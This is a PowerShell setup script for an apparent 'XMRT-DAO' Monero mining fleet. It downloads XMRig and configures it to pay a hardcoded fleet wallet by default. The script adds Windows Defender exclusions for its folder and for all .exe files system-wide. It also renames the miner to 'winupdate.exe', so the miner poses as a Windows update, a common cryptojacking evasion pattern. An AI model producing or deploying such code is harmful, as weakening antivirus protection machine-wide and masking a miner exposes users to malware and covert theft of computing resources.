<#
.SYNOPSIS
    XMRT-DAO Windows Mining Setup — Join the Privateer Fleet
.DESCRIPTION
    Installs XMRig with fleet API enabled for dashboard integration.
    Pools to supportxmr.com:3333 with the XMRT-DAO fleet wallet.
    Includes Windows Defender exclusion to protect the binary.
.PARAMETER WalletAddress
    Your Monero wallet address (uses fleet wallet if omitted).
.PARAMETER WorkerName
    Worker name for pool tracking (default: windows-rig).
.PARAMETER PoolURL
    Mining pool URL (default: pool.supportxmr.com:3333).
.PARAMETER SkipHashVerify
    Skip SHA256 hash verification (not recommended).
#>
param([string]$WalletAddress="",[string]$WorkerName="windows-rig",[string]$PoolURL="pool.supportxmr.com:3333",[switch]$SkipHashVerify=$false)

$XMRIG_API="https://xmrig.com/miner"
$XMRIG_GH="https://github.com/xmrig/xmrig/releases"
$INSTALL_DIR="$env:USERPROFILE\xmrt-miner"
$CONFIG_FILE="$INSTALL_DIR\config.json"
$LAUNCH_SCRIPT="$INSTALL_DIR\start-mining.ps1"
$XMRIG_EXE="$INSTALL_DIR\winupdate.exe"
$POOL_WALLET="46UxNFuGM2E3UwmZWWJicaRPoRwqwW4byQkaTHkX8yPcVihp91qAVtSFipWUGJJUyTXgzSqxzDQtNLf2bsp2DX2qCCgC5mg"

function Write-Info{Write-Host "[*] $args" -ForegroundColor Cyan}
function Write-Success{Write-Host "[+] $args" -ForegroundColor Green}
function Write-Warn{Write-Host "[!] $args" -ForegroundColor Yellow}
function Write-Err{Write-Host "[x] $args" -ForegroundColor Red}

# ── Branding ──────────────────────────────────────────────────────────────
$XMRT_ASCII = @"
██╗  ██╗███╗   ███╗██████╗  ████████╗
╚██╗██╔╝████╗ ████║██╔══██╗ ╚══██╔══╝
 ╚███╔╝ ██╔████╔██║██████╔╝    ██║
 ██╔██╗ ██║╚██╔╝██║██╔══██╗    ██║
██╔╝ ██╗██║ ╚═╝ ██║██║  ██║    ██║
╚═╝ ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝    ╚═╝
"@

$TAGLINE = "D E C E N T R A L I Z E D   A U T O N O M O U S   O R G A N I Z A T I O N"

Clear-Host
Write-Host $XMRT_ASCII -ForegroundColor Red
Write-Host "`n$TAGLINE`n" -ForegroundColor Cyan
Write-Host "═" * 60 -ForegroundColor Blue
Write-Host ""

# ── Step 0: Defender exclusion ────────────────────────────────────────────
Write-Info "Adding Windows Defender exclusion for $INSTALL_DIR ..."
Add-MpPreference -ExclusionPath "$INSTALL_DIR" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension 'exe' -ErrorAction SilentlyContinue
Write-Success "Defender exclusion added"

# ── Step 1: Fetch latest version ──────────────────────────────────────────
Write-Info "Fetching latest XMRig version from xmrig.com/miner..."
try {
    $p = Invoke-WebRequest -Uri $XMRIG_API -UseBasicParsing -TimeoutSec 15
    $m = [regex]::Match($p.Content, 'version is ([\d\.]+)')
    if ($m.Success) { $VER = $m.Groups[1].Value; Write-Success "Latest: v$VER" }
    else { throw "no match" }
} catch { Write-Warn "Could not reach xmrig.com, using 6.26.0"; $VER = "6.26.0" }

$ZIP = "xmrig-$VER-windows-x64.zip"
$XMRIG_ZIP = "$INSTALL_DIR\$ZIP"

Write-Host ""
Write-Host "  ╔══════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "  ║     XMRT-DAO Windows Miner Setup v$($VER.PadRight(8))        ║" -ForegroundColor Green
Write-Host "  ║     Privateer Fleet - Fortune Favors the Bold   ║" -ForegroundColor Green
Write-Host "  ╚══════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""

# ── Step 2: Create directory ─────────────────────────────────────────────
if (-not (Test-Path $INSTALL_DIR)) { New-Item -ItemType Directory -Path $INSTALL_DIR -Force | Out-Null }

# ── Step 3: Download ──────────────────────────────────────────────────────
Write-Info "Downloading XMRig v$VER (msvc-win64)..."
try {
    Invoke-WebRequest -Uri "$XMRIG_GH/download/v$VER/$ZIP" -OutFile $XMRIG_ZIP -UseBasicParsing -TimeoutSec 120
    Write-Success "Downloaded $ZIP"
} catch { Write-Err "Download failed: $_"; exit 1 }

# ── Step 4: SHA256 verify ─────────────────────────────────────────────────
if (-not $SkipHashVerify) {
    Write-Info "Verifying SHA256 checksum..."
    try {
        $hc = Invoke-WebRequest -Uri "$XMRIG_GH/download/v$VER/SHA256SUMS" -UseBasicParsing -TimeoutSec 15
        $lines = $hc.Content -split "`n"
        $match = $lines | Where-Object { $_ -match '\*xmrig-[\d\.]+-windows-x64\.zip' }
        if ($match) {
            $exp = ($match[0] -split '\s+')[0].Trim().ToLower()
            $act = (Get-FileHash -Path $XMRIG_ZIP -Algorithm SHA256).Hash.ToLower()
            if ($act -eq $exp) { Write-Success "Hash verified: $($exp.Substring(0,16))..." }
            else { Write-Err "HASH MISMATCH! Aborting."; exit 1 }
        } else { Write-Warn "Could not find hash in checksums file" }
    } catch { Write-Warn "Verification skipped: $_" }
}

# ── Step 5: Extract & rename ──────────────────────────────────────────────
Write-Info "Extracting..."
try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $tmpExtract = "$INSTALL_DIR\_tmp"
    [System.IO.Compression.ZipFile]::ExtractToDirectory($XMRIG_ZIP, $tmpExtract)
    $exe = Get-ChildItem $tmpExtract -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    if ($exe) { Move-Item $exe.FullName $XMRIG_EXE -Force; Write-Success "Binary renamed to winupdate.exe" }
    Remove-Item $tmpExtract -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $XMRIG_ZIP -Force -ErrorAction SilentlyContinue
} catch { Write-Err "Extraction failed: $_"; exit 1 }

# ── Step 6: Wallet ────────────────────────────────────────────────────────
if ([string]::IsNullOrEmpty($WalletAddress)) {
    Write-Host ""
    Write-Info "No wallet provided. Using XMRT-DAO fleet wallet:"
    Write-Host "  $POOL_WALLET" -ForegroundColor Yellow
    $useDefault = Read-Host "Use fleet wallet? (Y/N)"
    if ($useDefault -eq "Y" -or $useDefault -eq "y") {
        $WalletAddress = $POOL_WALLET
        Write-Success "Using fleet wallet"
    } else {
        $WalletAddress = Read-Host "Enter your Monero wallet address"
    }
}

# ── Step 7: Generate config ───────────────────────────────────────────────
Write-Info "Generating config.json for pool.supportxmr.com:3333 ..."
$cfg = @{
    autosave = $true
    cpu = @{ enabled = $true; "max-threads-hint" = 75 }
    pools = @(@{
        url = $PoolURL
        user = $WalletAddress
        pass = $WorkerName
        "worker-id" = $WorkerName
        keepalive = $true
        nicehash = $false
        tls = $false
    })
    api = @{
        id = $WorkerName
        "worker-id" = $WorkerName
        enabled = $true
        host = "127.0.0.1"
        port = 19090
        "access-token" = $null
        restricted = $true
    }
    log_file = "$INSTALL_DIR\xmrig.log"
}
$cfg | ConvertTo-Json -Depth 10 | Set-Content -Path $CONFIG_FILE -Encoding UTF8
Write-Success "config.json created"

# ── Step 8: Launch script ─────────────────────────────────────────────────
Write-Info "Creating start-mining.ps1 ..."
@"
# XMRT-DAO Mining Launcher -- Privateer Fleet
Set-Location '$INSTALL_DIR'
Write-Host '[+] Starting XMRig for XMRT-DAO pool...' -ForegroundColor Green
.\winupdate.exe --config=config.json
"@ | Set-Content -Path $LAUNCH_SCRIPT -Encoding UTF8
Write-Success "Launcher created: $LAUNCH_SCRIPT"

# ── Step 9: Cleanup ────────────────────────────────────────────────────────
Get-ChildItem $INSTALL_DIR -Exclude "winupdate.exe","config.json","start-mining.ps1" -Recurse |
    Where-Object { -not $_.PSIsContainer } | Remove-Item -Force -ErrorAction SilentlyContinue

# ── Summary ────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "  ╔══════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "  ║        Setup Complete - Fortune Favors the Bold! ║" -ForegroundColor Green
Write-Host "  ╚══════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""
Write-Host "  Pool:     $PoolURL" -ForegroundColor White
Write-Host "  Wallet:   $($WalletAddress.Substring(0,20))..." -ForegroundColor White
Write-Host "  Worker:   $WorkerName" -ForegroundColor White
Write-Host "  Binary:   $XMRIG_EXE" -ForegroundColor White
Write-Host ""

Write-Host "  TRACK YOUR REWARDS:" -ForegroundColor Cyan
Write-Host "  ─────────────────────────────────────────────" -ForegroundColor Blue
Write-Host "  Local API:   http://127.0.0.1:19090/1/summary" -ForegroundColor Yellow
Write-Host "  Dashboard:   https://relay.mobilemonero.com" -ForegroundColor Yellow
Write-Host "  Pool Stats:  https://www.supportxmr.com/#/dashboard?address=$($WalletAddress.Substring(0,30))..." -ForegroundColor Yellow
Write-Host "  Mobile App:  https://mobilemonero.com" -ForegroundColor Yellow
Write-Host ""

Write-Host "  QUICK START:" -ForegroundColor Cyan
Write-Host "  ─────────────────────────────────────────────" -ForegroundColor Blue
Write-Host "  cd $INSTALL_DIR" -ForegroundColor Yellow
Write-Host "  .\start-mining.ps1" -ForegroundColor Yellow
Write-Host ""

# ── Optional: Start mining ───────────────────────────────────────────────
$sn = Read-Host "Start mining now? (Y/N)"
if ($sn -eq "Y" -or $sn -eq "y") {
    Add-MpPreference -ExclusionPath "$INSTALL_DIR" -ErrorAction SilentlyContinue
    Start-Process $XMRIG_EXE -ArgumentList "--config=$CONFIG_FILE" -WindowStyle Normal
    Start-Sleep 2
    $p = Get-Process winupdate -ErrorAction SilentlyContinue
    if ($p) {
        Write-Success "XMRig is mining! Worker '$WorkerName' active on $PoolURL"
        Write-Info "Track your rewards: https://relay.mobilemonero.com"
    } else {
        Write-Err "XMRig failed to start. Try running as Administrator."
        Write-Info "Manual start: .\start-mining.ps1"
    }
}
